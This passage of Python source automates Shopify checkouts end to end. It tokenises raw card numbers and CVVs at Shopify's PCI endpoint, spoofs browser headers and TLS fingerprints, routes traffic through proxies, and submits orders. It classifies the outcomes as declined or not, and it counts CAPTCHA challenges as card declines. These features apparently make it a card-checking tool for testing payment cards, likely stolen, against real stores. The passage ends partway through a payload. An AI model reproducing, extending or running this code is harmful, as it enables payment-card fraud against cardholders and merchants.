        if delivery.get("__typename") == "FilledDeliveryTerms":
            lines = delivery.get("deliveryLines") or []
            if lines:
                strats = lines[0].get("availableDeliveryStrategies") or []
                if strats:
                    best = min(
                        strats,
                        key=lambda s: float(s.get("amount", {}).get("value", {}).get("amount", 999999)))
                    handle = best.get("handle", "")
                    amount = best.get("amount", {}).get("value", {}).get("amount", "")
                    return str(handle), str(amount) if amount is not None else ""
    except Exception:
        pass
    return "", ""

def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        de          = seller.get("deliveryExpectations", {})
        de_typename = de.get("__typename", "")

        if de_typename == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]

        if "deliveryExpectations" in de:
            expectations = de.get("deliveryExpectations", [])
            if isinstance(expectations, list):
                handles = [x.get("signedHandle") for x in expectations if x.get("signedHandle")]
                if handles:
                    return handles

        if de_typename in ["UnfilledDeliveryExpectationTerms", "UnavailableTerms"]:
            return []

    except Exception:
        pass
    return []

def _as_amount(v: Any):
    """Coerce a JSON money amount (string / int / float) to a clean string."""
    if v is None or v == "":
        return ""
    if isinstance(v, float):
        return ("%.2f" % v)
    return str(v)

def _proposal_node(proposal_json: str):
    """Deserialised sellerProposal node of a negotiate/proposal response."""
    try:
        return (json.loads(proposal_json)
                    .get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {}))
    except Exception:
        return None

def _submit_seller_proposal(submit_json: str):
    """Deserialised sellerProposal node of a submitForCompletion response."""
    try:
        return (json.loads(submit_json)
                    .get("data", {})
                    .get("submitForCompletion", {})
                    .get("sellerProposal", {}))
    except Exception:
        return None

def _sub_amount(node: Any, wanted: str) -> str:
    """Search a JSON subtree for a Money node keyed `wanted`
    (amount directly, or under a `value` wrapper); returns its amount string.
    Tolerates string or numeric amounts and any key ordering."""
    found = ""
    def walk(n):
        nonlocal found
        if isinstance(n, dict):
            for k, v in n.items():
                if k == wanted and isinstance(v, dict):
                    for a in (v.get("amount"), v.get("value", {}).get("amount") if isinstance(v.get("value"), dict) else None):
                        if isinstance(a, (str, int, float)) and a not in ("", None):
                            found = _as_amount(a)
                            break
                walk(v)
        elif isinstance(n, list):
            for it in n:
                walk(it)
    walk(node)
    return found

def extract_shipping_amount(proposal_body: str) -> str:
    match = re.search(
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"?([0-9]+(?:\.[0-9]+)?)"?',
        proposal_body)
    return match.group(1) if match else ""

def extract_checkout_total(proposal_body: str) -> str:
    match = re.search(
        r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"?([0-9]+(?:\.[0-9]+)?)"?',
        proposal_body)
    if match:
        return match.group(1)
    node = _proposal_node(proposal_body)
    return _sub_amount(node, "checkoutTotal") if node is not None else ""

def extract_seller_total(proposal_body: str) -> str:
    match = re.search(
        r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"?([0-9]+(?:\.[0-9]+)?)"?',
        proposal_body)
    if match:
        return match.group(1)
    node = _proposal_node(proposal_body)
    return _sub_amount(node, "total") if node is not None else ""

def extract_running_total(proposal_json: str) -> str:
    node = _proposal_node(proposal_json)
    if node is not None:
        val = node.get("runningTotal", {}).get("value", {})
        return _as_amount(val.get("amount"))
    return ""

def extract_seller_merchandise_price(proposal_body: str) -> str:
    match = re.search(
        r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""

def extract_seller_currency(proposal_body: str) -> str:
    match = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_country(proposal_body: str) -> str:
    match = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_tax_amount(proposal_json: str) -> str:
    node = _proposal_node(proposal_json)
    if node is not None:
        try:
            val = (node.get("tax", {})
                       .get("totalTaxAmount", {})
                       .get("value", {}))
            return _as_amount(val.get("amount")) or "0.0"
        except Exception:
            return "0.0"
    return "0.0"

def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        val = (seller.get("tax", {})
                    .get("totalTaxAmount", {})
                    .get("value", {}))
        return _as_amount(val.get("amount")) or "0.0"
    except Exception:
        return "0.0"

def extract_rejected_totals(submit_json: str) -> Tuple[str, str]:
    """Corrected checkout total + tax reported by Shopify when a submitted
    proposal does not cover the full amount due. Returns ("", "") if absent."""
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        total = ""
        for key in ("checkoutTotal", "total", "runningTotal"):
            for src in (seller.get(key, {}), seller.get(key, {}).get("value", {})):
                if not isinstance(src, dict):
                    continue
                a = _as_amount(src.get("amount"))
                if a:
                    total = a
                    break
            if total:
                break
        tax = _as_amount((seller.get("tax", {})
                              .get("totalTaxAmount", {})
                              .get("value", {})
                              .get("amount")))
        return total, tax
    except Exception:
        return "", ""

def extract_payment_flexibility_template(proposal_body: str) -> str:
    """Payment flexibility terms template id the checkout expects the buyer to
    accept (e.g. "gid://shopify/PaymentTermsTemplate/9"). Appears on the
    sellerProposal.payment as paymentFlexibilityPaymentTermsTemplate.
    Returns "" when the checkout has no flexibility terms."""
    for node in (_proposal_node(proposal_body),
                 _submit_seller_proposal(proposal_body)):
        if not node:
            continue
        try:
            tpl = (node.get("payment", {}).get("paymentFlexibilityPaymentTermsTemplate")
                   or {})
            tpl_id = tpl.get("id", "") or ""
            if tpl_id:
                return tpl_id
        except Exception:
            pass
    return ""

def extract_pending_poll_delay(submit_body: str, default: float = 1.2) -> float:
    """Best-effort delay (seconds) to honour when Shopify reports
    WAITING_PENDING_TERMS before accepting the updated seller terms."""
    for pat in (r'"pollDelay"\s*:\s*(\d+)',
                r'"progressiveRatesEstimatedTimeUntilCompletion"\s*:\s*(\d+)'):
        m = re.search(pat, submit_body)
        if m:
            try:
                return max(0.0, min(int(m.group(1)) / 1000.0, 3.0))
            except (TypeError, ValueError):
                break
    return default

def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            for src in (seller.get(key, {}), seller.get(key, {}).get("value", {})):
                if not isinstance(src, dict):
                    continue
                a = _as_amount(src.get("amount"))
                if a:
                    return a
        return ""
    except Exception:
        return ""

def extract_receipt_id(submit_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return match.group(1) if match else ""

def extract_receipt_session_token(submit_body: str) -> str:
    match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""

def extract_any_error(submit_body: str) -> str:
    for pattern in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        match = re.search(pattern, submit_body)
        if match:
            return match.group(1)
    return ""

# Shopify SubmitForCompletion "renegotiation" errors — checkout-flow / state
# problems (HTTP 200 SubmitRejected), NOT bank decisions. A card must never be
# labelled DECLINED because of these.
FLOW_ERROR_CODES = (
    "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
    "PAYMENTS_PAYMENT_METHOD_CHANGED",
    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
    "DELIVERY_DELIVERY_OPTION_CHANGED",
    "WAITING_PENDING_TERMS",
    "PAYMENT_AMOUNT_CHANGED",
    "ORDER_TOTAL_CHANGED",
    "WaitForRecapRequirements",
)

# Shopify often reports the human-readable nonLocalizedMessage instead of the
# machine code (or alongside it). Map those message fragments back to their
# flow-error code so renegotiation/retry kicks in instead of leaking the raw
# sentence into the API response.
FLOW_ERROR_MESSAGE_FRAGMENTS = (
    ("PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
     ("payment flexibility terms id mismatch", "flexibility terms", "payment flexibility")),
    ("PAYMENTS_PAYMENT_METHOD_CHANGED",
     ("payment method changed",)),
    ("DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
     ("delivery line detail changed",)),
    ("DELIVERY_DELIVERY_OPTION_CHANGED",
     ("delivery option changed",)),
    ("WAITING_PENDING_TERMS",
     ("waiting for pending terms", "pending terms")),
    ("PAYMENT_AMOUNT_CHANGED",
     ("payment amount changed",)),
    ("ORDER_TOTAL_CHANGED",
     ("order total changed",)),
    ("WaitForRecapRequirements",
     ("recap requirements", "waiting for recap")),
)

def extract_flow_error(submit_body: str) -> str:
    """Return the first known checkout-renegotiation / flow-error code found in a
    SubmitForCompletion response body, or '' if the body isn't a flow rejection.
    Used to keep flow problems out of the DECLINED bucket. Matches both the
    machine code and the human-readable non-localized message fragment."""
    if not submit_body:
        return ""
    low = submit_body.lower()
    if '"SubmitRejected"' in low:
        for code in FLOW_ERROR_CODES:
            if code in low:
                return code
        for code, fragments in FLOW_ERROR_MESSAGE_FRAGMENTS:
            if any(frag in low for frag in fragments):
                return code
        return "SUBMIT_REJECTED"
    for code in FLOW_ERROR_CODES:
        if code in low:
            return code
    for code, fragments in FLOW_ERROR_MESSAGE_FRAGMENTS:
        if any(frag in low for frag in fragments):
            return code
    return ""

def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if match:
        code = match.group(1)
        if "CAPTCHA" in code:
            return "CARD_DECLINED"
        return code
    if "CAPTCHA" in poll_body:
        return "CARD_DECLINED"
    if receipt_type == "FailedReceipt":
        return "FAILED"
    return "UNKNOWN"

def detect_shipping_restriction(proposal_body: str) -> bool:
    restriction_signals = [
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "noDeliveryOptionsAvailable",
        "delivery is not available",
        "does not ship to",
    ]
    lower = proposal_body.lower()
    return any(s.lower() in lower for s in restriction_signals)

# ──────────────────────── Payload helpers ────────────────────────────

_RE_PATCH_CURRENCY_CODE = re.compile(r'"currencyCode"\s*:\s*"[A-Z]{3}"')
_RE_PATCH_PRESENTMENT   = re.compile(r'"presentmentCurrency"\s*:\s*"[A-Z]{3}"')
_RE_PATCH_COUNTRY_CODE  = re.compile(r'"countryCode"\s*:\s*"[A-Z]{2}"')
_RE_PATCH_PHONE_COUNTRY = re.compile(r'"phoneCountryCode"\s*:\s*"[A-Z]{2}"')

def patch_payload(payload: str, currency: str, country: str) -> str:
    """
    Replace every hard-coded currency/country token in a JSON string.
    Mirrors app.go patchPayload exactly — must be called AFTER json.dumps().
    This is what lets AUD/CAD/GBP-only shops complete a checkout instead of
    returning BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED.
    """
    payload = _RE_PATCH_CURRENCY_CODE.sub(f'"currencyCode": "{currency}"', payload)
    payload = _RE_PATCH_PRESENTMENT.sub(f'"presentmentCurrency": "{currency}"', payload)
    payload = _RE_PATCH_COUNTRY_CODE.sub(f'"countryCode": "{country}"', payload)
    payload = _RE_PATCH_PHONE_COUNTRY.sub(f'"phoneCountryCode": "{country}"', payload)
    return payload

def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"

def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"

# ──────────────────────── Step 9: PCI tokenisation ───────────────────

def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "") -> Tuple[int, str]:

    payload = json.dumps({
        "credit_card": {
            "number":             card_number,
            "month":              card_month,
            "year":               card_year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": shop_domain,
    })

    headers = {
        "accept":               "application/json",
        "accept-language":      "en-US,en;q=0.9",
        "content-type":         "application/json",
        "origin":               "https://checkout.pci.shopifyinc.com",
        "priority":             "u=1, i",
        "referer":              "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua":            '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":     "?0",
        "sec-ch-ua-platform":   '"Windows"',
        "sec-fetch-dest":       "empty",
        "sec-fetch-mode":       "cors",
        "sec-fetch-site":       "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }

    with Session(impersonate="chrome124") as session:
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
        status, body = 0, ""
        for attempt in range(3):
            resp = session.post("https://checkout.pci.shopifyinc.com/sessions",
                                data=payload, headers=headers, timeout=12)
            status, body = resp.status_code, resp.text
            if 200 <= status < 300:
                break
            time.sleep(1.0 * (attempt + 1) + random.uniform(0, 0.3))
    return status, body

# ──────────────────────── Proposal helpers ───────────────────────────

def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, build_id: str, source_token: str) -> Dict:
    return {
        "accept":                        "application/json",
        "accept-language":               "en-US",
        "content-type":                  "application/json",
        "origin":                        shop_url,
        "priority":                      "u=1, i",
        "referer":                       checkout_url,
        "sec-ch-ua":                     '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":              "?0",
        "sec-ch-ua-platform":            '"Windows"',
        "sec-fetch-dest":                "empty",
        "sec-fetch-mode":                "cors",
        "sec-fetch-site":                "same-origin",
        "shopify-checkout-client":       "checkout-web/1.0",
        "shopify-checkout-source":       f'id="{checkout_token}", type="cn"',
        "user-agent":                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
        "x-checkout-one-session-token":  session_token,
        "x-checkout-web-build-id":       build_id,
        "x-checkout-web-deploy-stage":   "production",
        "x-checkout-web-server-handling":"fast",
        "x-checkout-web-server-rendering":"yes",
        "x-checkout-web-source-id":      source_token,
    }

# ──────────────────────── Step 4: Proposal 1 ─────────────────────────

def send_proposal(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                  session_token: str, stable_id: str, variant_id: str, price: str,
                  proposal_id: str, build_id: str, source_token: str,
                  currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 5: Proposal 2 (email) ─────────────────

def send_proposal2(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 6: Proposal 3 (address) ───────────────

def send_proposal3(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, addr: Address, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 10: SubmitForCompletion ───────────────

def send_poll_for_receipt(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, build_id: str, source_token: str,
                          poll_id: str, receipt_id: str, receipt_session_token: str) -> Tuple[int, str]:

    params   = {
        "operationName": "PollForReceipt",
        "variables":     json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id":            poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"

    headers  = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token

    resp = client.get(full_url, headers=headers)
    return resp.status_code, resp.text

def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                               session_token: str, stable_id: str, variant_id: str, price: str,
                               submit_id: str, build_id: str, source_token: str, queue_token: str,
                               email: str, addr: Address, delivery_handle: str, shipping_amount: str,
                               total_amount: str, pci_session_id: str, attempt_token: str,
                               currency: str, country: str, signed_handles: List[str],
is_digital: bool = False,
                                tax_amount: str = None,
                                total_any: bool = False,
                                payment_flex_terms_id: str = None) -> Tuple[int, str]:

    handle_lines       = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id            = generate_page_id()

    if is_digital or total_any:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital or total_any:
        amount_line = '"amount": {"any": true}'
    else:
        amount_line = f'"amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if payment_flex_terms_id:
        flex_block = (f'"paymentFlexibilityTerms": '
                      f'[{{"paymentTermsTemplateId": "{payment_flex_terms_id}"}}],')
    else:
        flex_block = ""

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val   = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        {flex_block}
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
